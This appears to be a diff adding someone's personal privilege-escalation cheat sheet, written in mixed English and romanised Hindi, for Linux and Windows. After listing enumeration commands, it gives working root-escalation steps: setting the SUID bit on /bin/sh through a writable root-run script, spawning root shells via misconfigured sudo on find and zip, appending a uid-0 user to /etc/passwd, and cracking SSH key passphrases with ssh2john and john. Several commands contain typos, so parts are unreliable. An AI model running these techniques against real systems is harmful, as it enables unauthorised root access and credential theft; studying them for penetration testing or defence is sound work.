@@ -1,0 +1,64 @@
+commands:
+{Linux}{Windows}
+{whoami}{whoami}    //current user
+{id}{net user username}     // give complete info about user
+{cat /etc/passwd}{net user}     // give info of all the users present
+{hostname}{hostname}   //finding hostname
+{uname -a}{systeminfo}         // finding kernel version
+{cat /etc/*-release}{systeminfo}   // all info about machine
+{ps axu}{tasklist /svc}                // for checking running services or process on the machine, we have to check for all the services and we have to enumerate them and look for the one in which we can make changes so it can work in our favour
+we can also use ps aux | grep root for root service only
+{}{ipconfig /all}        // gives info about all connections and network adapter
+{routel}{route print}            // give info about to which network interface what is attached
+{as -anp}{netstat -ano}           // give info about all the listening ports and services running
+{}{netsh advfirewall show currentporifle}       // give info about firewall ,in linux for that we need root privileges
+{ls -lah /etc/cron* }{schtasks /query /fo LIST /}                   // give info about scedule tasks
+{cat /etc/crontab}{}                                                     ,,,
+{find / -writable -type f 2>/dev/null }{Get-ChildItem "C:\Program Files" -Recurse | Get-Ac1 | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}}        // use powershell for windows,and in linux f means file and d means directory, basically yein woh sarri file or directory ist krega jinhe hum modify kr sakte hai
+
+
+
+privileges escalation mein jada kuch nhi krna hota , bus dhudna hota hai esa program jo ki as a root run krta ho and kisi bhi user dwara editable ho, suppose hami koi script as a root run krti dikhaye de rahi hai jo ki kisi bhi user ke through writable hai toh bas uss script me modify krke ; chmod u+s /bin/sh execute krwa de usse hoga yein ke aab har user ke liye /bin/sh shell root privileges ke saath run hoga and phir script ke run hote hi:
+/bin/sh -p ya phir sh -p  type krte hi hum root privileges ke saath command execute kr payenge.
+note : -p lagana is must
+
+SUID executable: this are executable files which can run by any user with superuser privileges , basically this files have superuser bits permission which allow any user to execute them.
+how to find suid files: find / -perm -4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+SUDO -FILE : basically hota yein hai ki normally toh sudo -l type krne ke liye bhi permission lagti hai but kuch misconfiguration hone par hum bina password ke bhi sudo -l command use krke check kr sakte hai kis kis ko root privileges mila hua hai, 
+normally /usr/bin/find    command jo ki text,file or directory find krne ke liye use hota hai hum usse sudo ke saaath use krke bina passwd ke bhi command eecute kr sakte hai agar sudo misconfigured hai toh try below command:
+sudo /usr/bin/find . -exec /bin/bash \;
+iss command se root shell miljayega and password ke liye bhi nhi puchega haa lekin agar /usr/bin/find ko sudo binary misconfiguration nahi hoga toh password ke liye puchega
+SUDO-NANO : agar kisi bhi text editor ko sudo privileges mili hui hai toh usske through root privileges mill skti hai
+
+// some imp privilege escalation commands:
+history , who ,last ,w , netstat -ant,
+
+
+
+privilege escalation using zip command:
+if sudo -l is working and if it give results like we can use /usr/bin/zip as a root without password then we can do:
+
+touch test
+sudo -u root zip test test.zip -T --unzip-command="sh -c /bin/bash"
+
+
+privilege escalation by adding new user with uid and gid  0 , 
+agar hum /etc/passwd mein kuch bhi likh sakte hai tab hum ussmein naya user add kr sakte hai usske liye hummein pahle password hash lagega: 
+for this 
+openssl passwd -1 -salt our_password
+yein command hash dega jo humein $ sign ko bhi lekar etc/passwd mein add krna hai
+for that
+echo 'newusername:hash_along_with_the_dollar_sign:0:0::/root:/bin/bash' >> /etc/passwd
+then check that user is added in /etc/passwd file or not after that : 
+su newusername
+and login with the our_password
+
+
+ssh2john.py
+basically sometimes we ssh private key but while loging through it tells invalid format and ask for the password in that case use this script to convert private key (id_rsa) to hash and then hash to password for ligin
+/usr/share/john/ssh2john.py id_rsa > hash
+now crack this hash
+john --wordlists=/usr/share/wordlists/rockyou.txt hash 
+it will give the password
